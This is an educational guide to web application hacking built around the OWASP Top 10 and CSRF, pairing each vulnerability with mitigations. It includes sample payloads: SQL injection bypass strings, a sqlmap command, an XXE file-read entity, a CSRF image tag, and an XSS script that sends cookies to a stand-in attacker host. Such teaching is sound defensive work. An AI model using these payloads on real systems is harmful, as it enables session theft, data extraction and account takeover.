# Web Application Hacking

Web applications are a primary target for attackers due to their accessibility and the valuable data they often process. This section delves into common web application vulnerabilities, primarily focusing on the OWASP Top 10, and provides practical insights into how they are exploited and mitigated.

## OWASP Top 10

The Open Web Application Security Project (OWASP) Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications. While the specific list is updated periodically, the underlying principles remain crucial. (We will refer to common recurring themes, but always check the latest list at [owasp.org](https://owasp.org/www-project-top-ten/)).

Here are some of the perennial categories and examples:

### 1. Injection (e.g., SQL Injection - SQLi)

*   **Explanation:** Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
*   **Example (SQL Injection):**
    Imagine a login form with a username field. A legitimate query might be:
    `SELECT * FROM users WHERE username = 'user_input_username';`
    An attacker might input: `' OR '1'='1`
    This could transform the query into:
    `SELECT * FROM users WHERE username = '' OR '1'='1';`
    Since `'1'='1'` is always true, this could bypass authentication.
*   **Step-by-Step Exploitation (Conceptual):**
    1.  **Identify Input Vectors:** Find all user-controllable inputs (URL parameters, form fields, HTTP headers).
    2.  **Fuzz for SQLi:** Insert SQL metacharacters (e.g., `'`, `"`, `;`, `--`) to see if the application's behavior changes or errors occur.
    3.  **Confirm Vulnerability:** Craft inputs to elicit true/false responses or extract data (e.g., using `UNION` statements, boolean-based blind, time-based blind SQLi).
    4.  **Extract Data:** Systematically retrieve database information (e.g., table names, column names, user credentials).
    *Tool Example (Sqlmap):* `sqlmap -u "http://target.com/vulnerable_page.php?id=1" --dbs`
*   **Mitigation:**
    *   **Prepared Statements (Parameterized Queries):** Primary defense. The query structure is defined first, and user input is treated as data, not executable code.
    *   **Input Validation:** Whitelist allowed characters/patterns and reject malicious input.
    *   **Least Privilege:** Ensure the application database account has minimal necessary permissions.
    *   **ORM Libraries:** Object-Relational Mapping libraries can auto-parameterize queries if used correctly.

### 2. Broken Authentication

*   **Explanation:** Incorrectly implemented authentication and session management functions can allow attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users' identities temporarily or permanently.
*   **Common Issues:**
    *   Weak password policies.
    *   Passwords stored in plaintext or weakly hashed.
    *   Session tokens that are predictable or not invalidated properly after logout or timeout.
    *   Lack of multi-factor authentication (MFA).
    *   Credential stuffing (using breached credentials from other sites).
*   **Step-by-Step Exploitation (Session Hijacking Example):**
    1.  **Sniff Network Traffic:** If session cookies are sent over HTTP (unencrypted), an attacker on the same network can capture them.
    2.  **Predictable Session Tokens:** If session IDs are sequential or easily guessable, an attacker can try different token values.
    3.  **Steal Session Cookies:** Through XSS attacks (see below) or by gaining access to the user's browser/machine.
    4.  **Use Stolen Token:** The attacker sets their browser's session cookie to the stolen value and gains access as the victim.
*   **Mitigation:**
    *   Strong password policies and secure password storage (e.g., bcrypt, Argon2).
    *   Implement Multi-Factor Authentication (MFA).
    *   Secure session management: generate long, random session tokens; invalidate tokens on logout/timeout; use HTTPS for all traffic.
    *   Protect against credential stuffing (e.g., account lockout, rate limiting).

### 3. Sensitive Data Exposure

*   **Explanation:** Many web applications and APIs do not properly protect sensitive data such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser.
*   **Common Issues:**
    *   Transmitting data in plaintext (especially over HTTP).
    *   Storing sensitive data unencrypted or weakly encrypted.
    *   Using weak encryption algorithms or keys.
    *   Exposing data in error messages or logs.
*   **Mitigation:**
    *   Encrypt all sensitive data in transit (use TLS/HTTPS).
    *   Encrypt sensitive data at rest (e.g., AES-256).
    *   Implement strong key management.
    *   Avoid storing sensitive data unless absolutely necessary.
    *   Properly handle exceptions and avoid verbose error messages in production.

### 4. XML External Entities (XXE)

*   **Explanation:** Many older or poorly configured XML processors evaluate external entity references within XML documents. XXE attackers can use external entities for attacks such as disclosing internal files, internal port scanning, remote code execution, and denial of service attacks.
*   **Example:**
    An attacker submits XML like:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <foo>&xxe;</foo>
    ```
    If the server parses this XML and includes the content of `&xxe;` in its response, it might reveal the contents of `/etc/passwd`.
*   **Mitigation:**
    *   Disable XML external entity and DTD processing in XML parsers.
    *   Use less complex data formats like JSON if possible.
    *   Input validation and sanitization.

### 5. Broken Access Control

*   **Explanation:** Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as accessing other users' accounts, viewing sensitive files, modifying other users’ data, changing access rights, etc.
*   **Common Issues:**
    *   Insecure Direct Object References (IDOR): Exposing a direct reference to an internal implementation object (e.g., `view_profile.php?user_id=123`). Attackers can change `user_id` to access other profiles.
    *   Missing function-level access control: An attacker can access administrative functions by directly browsing to the URL if the function doesn't check user privileges.
    *   Privilege escalation.
*   **Mitigation:**
    *   Enforce access controls on the server-side for every request.
    *   Use role-based access control (RBAC) mechanisms.
    *   Deny by default.
    *   For IDOR, use indirect references (e.g., map user-supplied IDs to internal IDs per session) or validate authorization for each direct reference.

### 6. Security Misconfiguration

*   **Explanation:** This is a very common issue, resulting from insecure default configurations, incomplete or ad-hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information.
*   **Common Issues:**
    *   Unnecessary features enabled (e.g., default services, pages, accounts).
    *   Default accounts and passwords unchanged.
    *   Verbose error messages revealing internal details.
    *   Missing security headers (e.g., Content Security Policy, HSTS).
    *   Directory listing enabled on the server.
*   **Mitigation:**
    *   Establish a hardening process for application, web server, and database server configurations.
    *   Remove or disable unnecessary features and services.
    *   Change default credentials.
    *   Implement proper error handling.
    *   Configure appropriate security headers.

### 7. Cross-Site Scripting (XSS)

*   **Explanation:** XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.
*   **Types of XSS:**
    *   **Stored XSS:** The malicious script is permanently stored on the target server (e.g., in a database, message forum, comment field). When a victim views the page, the script is served and executed.
    *   **Reflected XSS:** The malicious script is embedded in a URL or other request. When the victim clicks the link or submits the form, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser.
    *   **DOM-based XSS:** The vulnerability exists in client-side code rather than server-side code. The attacker's script is executed as a result of modifying the DOM environment in the victim's browser.
*   **Example (Reflected XSS):**
    A search page `search.php?query=<user_input>` displays the search term.
    If an attacker crafts a link like: `search.php?query=<script>alert('XSS')</script>`
    When a victim clicks this link, the script executes in their browser.
*   **Step-by-Step Exploitation (Conceptual for Reflected XSS):**
    1.  **Identify Input Vectors:** Find where user input is reflected in the HTTP response.
    2.  **Test for XSS:** Inject simple HTML tags (e.g., `<b>test</b>`) or JavaScript (e.g., `<script>alert(1)</script>`).
    3.  **Bypass Filters:** If basic XSS fails, try different encodings, event handlers, or more complex payloads.
    4.  **Craft Malicious Payload:** Create a script to steal session cookies, redirect users, or perform other actions.
    *Payload Example (Cookie Stealing):* `<script>document.location='http://attacker.com/cookiestealer.php?cookie=' + document.cookie</script>`
*   **Mitigation:**
    *   **Output Encoding:** Encode user-supplied data before displaying it on a page (e.g., HTML entity encoding for HTML context, JavaScript escaping for script context).
    *   **Content Security Policy (CSP):** A powerful browser mechanism to control what resources (scripts, styles, images) can be loaded and executed.
    *   **Input Validation:** Sanitize or reject user input that contains suspicious characters.
    *   **Use Safe Frameworks:** Modern web frameworks often have built-in XSS protection (e.g., auto-escaping in templates).

### 8. Insecure Deserialization

*   **Explanation:** Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.
*   **Common Issues:** Applications deserialize hostile or tampered objects supplied by an attacker.
*   **Mitigation:**
    *   Avoid deserializing data from untrusted sources.
    *   If deserialization is necessary, implement integrity checks (e.g., digital signatures) on the serialized objects.
    *   Monitor deserialization activity and log exceptions.

### 9. Using Components with Known Vulnerabilities

*   **Explanation:** Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.
*   **Mitigation:**
    *   **Inventory Components:** Identify all components and their versions used in your application.
    *   **Monitor Vulnerabilities:** Regularly check for vulnerabilities in these components using sources like CVE databases, NVD, and software composition analysis (SCA) tools.
    *   **Patch Management:** Apply security patches and updates promptly.
    *   **Remove Unused Components:** Uninstall or remove components that are not needed.

### 10. Insufficient Logging & Monitoring

*   **Explanation:** Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.
*   **Mitigation:**
    *   Ensure all login, access control failures, and server-side input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts.
    *   Establish effective monitoring and alerting so that suspicious activities are detected and responded to in a timely fashion.
    *   Implement an incident response plan.

## Practical Examples

### SQL Injection (SQLi) - Step-by-Step

(Covered in detail under "Injection" above)

### Cross-Site Scripting (XSS) - Step-by-Step

(Covered in detail under "Cross-Site Scripting (XSS)" above)

### Cross-Site Request Forgery (CSRF)

*   **Explanation:** CSRF attacks force a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.
*   **Example:**
    A web application allows a user to change their email address via a GET request:
    `http://example.com/change_email.php?new_email=attacker@evil.com`
    An attacker can embed this URL in an image tag on a forum they control:
    `<img src="http://example.com/change_email.php?new_email=attacker@evil.com" width="1" height="1" />`
    If a logged-in victim visits the attacker's forum page, their browser will automatically send the request to `example.com`, changing their email address without their knowledge.
*   **Step-by-Step Exploitation (Conceptual):**
    1.  **Identify Target Action:** Find an action in the target application that changes state (e.g., change password, transfer funds, add item to cart).
    2.  **Craft Malicious Request:** Create the HTML/JavaScript to trigger this action. For GET requests, this might be an `<img>` tag. For POST requests, it might be a hidden auto-submitting form.
    3.  **Deliver Payload:** Trick the victim into loading the malicious HTML (e.g., via a link, an email, or a compromised website).
*   **Mitigation:**
    *   **Anti-CSRF Tokens (Synchronizer Token Pattern):** Generate a unique, unpredictable token for each session and require it to be included in all state-changing requests. The server validates this token.
    *   **SameSite Cookie Attribute:** Set cookies to `SameSite=Strict` or `SameSite=Lax` to control when they are sent with cross-site requests.
    *   **Verify Origin with Standard Headers:** Check `Origin` or `Referer` headers (though these can sometimes be spoofed or missing).
    *   Require re-authentication for sensitive operations.

## Further Resources

-   [OWASP Top 10 Project](https://owasp.org/www-project-top-ten/)
-   [OWASP Application Security Verification Standard (ASVS)](https://owasp.org/www-project-application-security-verification-standard/)
-   [PortSwigger Web Security Academy](https://portswigger.net/web-security) (Excellent hands-on labs)
-   [The Web Application Hacker's Handbook (Book)](https://www.wiley.com/en-us/The+Web+Application+Hacker%27s+Handbook%3A+Finding+and+Exploiting+Security+Flaws%2C+2nd+Edition-p-9781118026472)
-   [MDN Web Security Guidelines](https://developer.mozilla.org/en-US/docs/Web/Security)
